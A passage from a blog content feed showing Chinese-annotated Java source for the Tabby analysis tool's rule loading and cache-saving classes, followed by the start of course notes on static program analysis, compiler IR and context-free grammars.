文件。接下来，它调用 methodRefService 对象的 save2Csv() 方法，将方法引用保存到 CSV 文件。最后，它调用 relationshipsService 对象的 save2CSV() 方法，将类之间的关系保存到 CSV 文件</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save2CSV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Save cache to CSV."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        classRefService<span class="token punctuation">.</span><span class="token function">save2Csv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methodRefService<span class="token punctuation">.</span><span class="token function">save2Csv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        relationshipsService<span class="token punctuation">.</span><span class="token function">save2CSV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Save cache to CSV. DONE!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// cleanAll() 方法用于清理 Neo4j 中 tabby.core 的数据。它首先记录日志，表示将要清理数据。然后，它调用 classService 对象的 clear() 方法，清理数据。最后，它返回 AsyncResult&lt;>(true) 对象，表示清理成功。</span>    <span class="token annotation punctuation">@Async</span><span class="token punctuation">(</span><span class="token string">"tabby-collector"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Boolean</span><span class="token punctuation">></span></span> <span class="token function">cleanAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Clean old tabby.core.data in Neo4j."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        classService<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Clean old tabby.core.data in Neo4j. DONE!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">AsyncResult</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// count() 方法用于统计数据。它首先计算了类引用和方法引用的总数。然后，它记录日志，输出统计结果。最后，它调用 relationshipsService 对象的 count() 方法，统计类之间的关系数量。</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> nodes <span class="token operator">=</span> classRefService<span class="token punctuation">.</span><span class="token function">countAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> methodRefService<span class="token punctuation">.</span><span class="token function">countAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Total &#123;&#125;, classes: &#123;&#125;, methods: &#123;&#125;"</span><span class="token punctuation">,</span> nodes<span class="token punctuation">,</span> classRefService<span class="token punctuation">.</span><span class="token function">countAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> methodRefService<span class="token punctuation">.</span><span class="token function">countAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        relationshipsService<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbycorecontainerrulescontainer.java">tabby/core/container/RulesContainer.java</h3><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>container</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">GlobalConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>data<span class="token punctuation">.</span></span><span class="token class-name">TabbyRule</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">FileUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileNotFoundException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token comment">/** * @author wh1t3P1g * @since 2020/11/20 */</span><span class="token annotation punctuation">@Slf4j</span><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RulesContainer</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">TabbyRule</span><span class="token punctuation">></span></span> rules <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> ignored<span class="token punctuation">;</span> <span class="token comment">// 已经分析过的jar包</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> excludedClasses<span class="token punctuation">;</span> <span class="token comment">// 不进行分析的类</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> basicClasses<span class="token punctuation">;</span> <span class="token comment">// 已经分析过的jar包</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> commonJars<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">RulesContainer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">FileNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">loadIgnore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">loadBasicClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">loadCommonJars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// getRule() 方法用于根据类名和方法名获取规则。它首先判断是否存在与类名 classname 对应的规则。如果存在，则获取规则对象。然后，判断规则对象是否包含方法名 method。如果包含，则返回规则对象中的方法名 method 对应的规则。否则，返回 null。</span>    <span class="token keyword">public</span> <span class="token class-name">TabbyRule<span class="token punctuation">.</span>Rule</span> <span class="token function">getRule</span><span class="token punctuation">(</span><span class="token class-name">String</span> classname<span class="token punctuation">,</span> <span class="token class-name">String</span> method<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>rules<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">TabbyRule</span> rule <span class="token operator">=</span> rules<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>rule<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> rule<span class="token punctuation">.</span><span class="token function">getRule</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// rules.getOrDefault(classname, null) 方法用于获取 Map 中与键 classname 对应的元素，如果不存在，则返回默认值 null。</span>    <span class="token keyword">public</span> <span class="token class-name">TabbyRule</span> <span class="token function">getRule</span><span class="token punctuation">(</span><span class="token class-name">String</span> classname<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> rules<span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span>classname<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// contains() 方法用于判断列表中是否包含指定的元素。</span>    <span class="token comment">// ignored 列表用于存储已被分析过的 jar 包。    </span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isIgnore</span><span class="token punctuation">(</span><span class="token class-name">String</span> jar<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> ignored<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>jar<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// isType() 方法用于判断指定类和方法的类型是否符合指定规则。它首先判断是否存在与类名 classname 对应的规则。如果存在，则获取规则对象。然后，判断规则对象是否包含方法名 method。如果包含，则获取规则对象中的方法名 method 对应的规则。最后，判断规则的类型是否与指定的类型 type 相同。如果相同，则返回 true；否则，返回 false。</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isType</span><span class="token punctuation">(</span><span class="token class-name">String</span> classname<span class="token punctuation">,</span> <span class="token class-name">String</span> method<span class="token punctuation">,</span> <span class="token class-name">String</span> type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>rules<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">TabbyRule</span> rule <span class="token operator">=</span> rules<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>rule<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token class-name">TabbyRule<span class="token punctuation">.</span>Rule</span> tr <span class="token operator">=</span> rule<span class="token punctuation">.</span><span class="token function">getRule</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>tr<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// load() 方法用于加载 Tabbie 规则。它首先使用 FileUtils 类的 getJsonContent() 方法，从指定的文件中读取 Tabbie 规则。然后，它将规则解析为 TabbyRule 对象，并将它们存储到 rules 属性中。</span>    <span class="token comment">// 具体的步骤如下：</span>    <span class="token comment">// 声明一个 TabbyRule 对象的列表。</span>    <span class="token comment">// 从指定的文件中读取 Tabbie 规则。</span>    <span class="token comment">// 将规则解析为 TabbyRule 对象。</span>    <span class="token comment">// 遍历规则列表，初始化每个规则对象。</span>    <span class="token comment">// 判断是否存在与规则对象的名称相同的规则。如果存在，则将规则合并到现有规则中。否则，将规则添加到 rules 属性中。</span>    <span class="token comment">// 记录加载规则的成功信息。</span>    <span class="token comment">// 抑制 unchecked 警告。</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"unchecked"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">FileNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">TabbyRule</span><span class="token punctuation">></span></span> tabbyRules <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TabbyRule</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sinkRules <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TabbyRule</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">getJsonContent</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">SINK_RULE_PATH</span><span class="token punctuation">,</span> <span class="token class-name">TabbyRule</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TabbyRule</span><span class="token punctuation">[</span><span class="token punctuation">]</span> systemRules <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TabbyRule</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">getJsonContent</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">SYSTEM_RULE_PATH</span><span class="token punctuation">,</span> <span class="token class-name">TabbyRule</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>sinkRules <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> systemRules <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FileNotFoundException</span><span class="token punctuation">(</span><span class="token string">"File sinks.json or system.json Not Found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>tabbyRules<span class="token punctuation">,</span> sinkRules<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>systemRules <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>tabbyRules<span class="token punctuation">,</span> systemRules<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">TabbyRule</span> rule<span class="token operator">:</span>tabbyRules<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            rule<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>rules<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>rule<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token class-name">TabbyRule</span> existRule <span class="token operator">=</span> rules<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>rule<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                existRule<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>rule<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                rules<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>rule<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rule<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"load "</span><span class="token operator">+</span> rules<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">" rules success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// loadIgnore() 方法用于加载 Tabbie 忽略列表。它首先使用 FileUtils 类的 getJsonContent() 方法，从指定的文件中读取 Tabbie 忽略列表。如果文件不存在，则创建一个新的 ArrayList 对象。</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"unchecked"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">loadIgnore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        ignored <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">getJsonContent</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IGNORE_PATH</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ignored <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            ignored <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"unchecked"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">loadBasicClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        basicClasses <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">getJsonContent</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">BASIC_CLASSES_PATH</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>basicClasses <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            basicClasses <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"unchecked"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">loadCommonJars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        commonJars <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">getJsonContent</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">COMMON_JARS_PATH</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>commonJars <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            commonJars <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// saveStatus() 方法用于保存 Tabbie 的状态。它首先判断是否需要创建忽略列表。如果需要，则使用 FileUtils 类的 putJsonContent() 方法，将忽略列表存储到指定的文件中。</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IS_NEED_TO_CREATE_IGNORE_LIST</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">putJsonContent</span><span class="token punctuation">(</span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">.</span><span class="token constant">IGNORE_PATH</span><span class="token punctuation">,</span> ignored<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 存储当前以分析的jar包</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// isInCommonJarList() 方法用于判断指定的文件是否在常用 JAR 列表中。它首先使用 for 循环，遍历 commonJars 列表。然后，它判断指定的文件名是否以列表中的任何元素开头。如果是，则返回 true。否则，返回 false。</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isInCommonJarList</span><span class="token punctuation">(</span><span class="token class-name">String</span> filename<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> common<span class="token operator">:</span>commonJars<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>common<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> Project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Static-Program-Analysis</title>
      <link href="/2023/12/09/static-program-analysis/"/>
      <url>/2023/12/09/static-program-analysis/</url>
      
        <content type="html"><![CDATA[<h3 id="resource">Resource</h3><ul><li><ahref="https://en.wikipedia.org/wiki/List_of_tools_for_static_code_analysis">Listof tools for static code analysis</a></li></ul><h3 id="写在前面">写在前面</h3><ul><li>命令式语言</li><li>学术门槛高</li><li>形式化语言验证</li></ul><h3 id="南京大学软件分析开始">南京大学《软件分析》开始</h3><h3 id="introduction">01（Introduction）</h3><ul><li><p>程序语言和静态分析<imgsrc="https://3744927830-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MJC1RRYQ991XoNX219t%2Fuploads%2Fgit-blob-88cbf646c680c5289c2863bcecd60f502e53c7a5%2FPL.png?alt=media"alt="img" /></p></li><li><p>sound 和 complete</p></li><li><p>确保soundness的情况下，权衡<strong>精确度</strong>和<strong>速度</strong></p></li><li><p>静态分析的要点</p><ol type="1"><li>Abstract</li><li>Over-approximate</li></ol></li></ul><h3 id="中间表示2023-06-24">02 中间表示（2023-06-24）</h3><h4 id="写在前面-1">写在前面</h4><ul><li>编译器将源代码（Source code） 转换为机器代码（MachineCode）。其中的流程框架是：<ol type="1"><li>词法分析器（Scanner），结合正则表达式，通过词法分析（LexicalAnalysis）将 source code 翻译为 token。</li><li>语法分析器（Parser），结合上下文无关文法（Context-FreeGrammar），通过语法分析（Syntax Analysis），将 token解析为抽象语法树（Abstract Syntax Tree, AST）。</li><li>语义分析器（Type Checker），结合属性文法（AttributeGrammar），通过语义分析（Semantic Analysis），将 AST 解析为 decoratedAST。</li><li>Translator，将 decorated AST翻译为生成三地址码这样的中间表示形式（Intermediate Representation,IR），并<strong>基于 IR做静态分析</strong>（例如代码优化这样的工作）。</li><li>Code Generator，将 IR 转换为机器代码。</li></ol></li><li>IR设计的初衷，自由设计</li><li>LLVM 中间表示</li></ul><h4 id="compilers-and-static-analyzers">Compilers and StaticAnalyzers</h4><ul><li><p><strong>上下文无关文法</strong>（Context-FreeGrammar，CFG）是一种形式语言的描述方法，用于描述生成或识别上下文无关语言的语法规则。它是计算机科学中的一个重要概念，广泛应用于编程语言设计、自然语言处理、编译器设计等领域。</p><p>上下文无关文法由<strong>四个部分</strong>组成：</p><ol type="1"><li>终结符（Terminals）：文法中的基本符号，表示不可再分的语言单元，如字母、数字等。</li><li>非终结符（Non-terminals）：文法中的符号，表示可以分解为其他符号序列的语言单元。</li><li>产生式规则（ProductionRules）：定义了非终结符如何被替换为终结符和/或非终结符的规则。每个产生式规则通常由一个非终结符作为左侧，箭头"-&gt;" 表示替换关系，右侧是由终结符和/或非终结符组成的序列。</li><li>起始符号（StartSymbol）：表示语法推导开始的符号，通常是一个非终结符。</li></ol><p>上下文无关文法的一个例子如下： <pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token class-name">S</span> <span class="token punctuation">-></span> <span class="token constant">NP</span> <span class="token constant">VP</span><span class="token constant">NP</span> <span class="token punctuation">-></span> <span class="token class-name">Det</span> <span class="token class-name">N</span><span class="token constant">VP</span> <span class="token punctuation">-></span> <span class="token class-name">V</span> <span class="token constant">NP</span><span class="token class-name">Det</span> <span class="token punctuation">-></span> <span class="token string">"the"</span> <span class="token operator">|</span> <span class="token string">"a"</span><span class="token class-name">N</span> <span class="token punctuation">-></span> <span class="token string">"cat"</span> <span class="token operator">|</span> <span class="token string">"dog"</span><span class="token class-name">V</span> <span class="token punctuation">-></span> <span class="token string">"chased"</span> <span class="token operator">|</span> <span class="token string">"ate"</span></code></pre> 在这个例子中，S是起始符号，NP、VP、Det、N 和 V是非终结符，"the"、"a"、"cat"、"dog"、"chased" 和 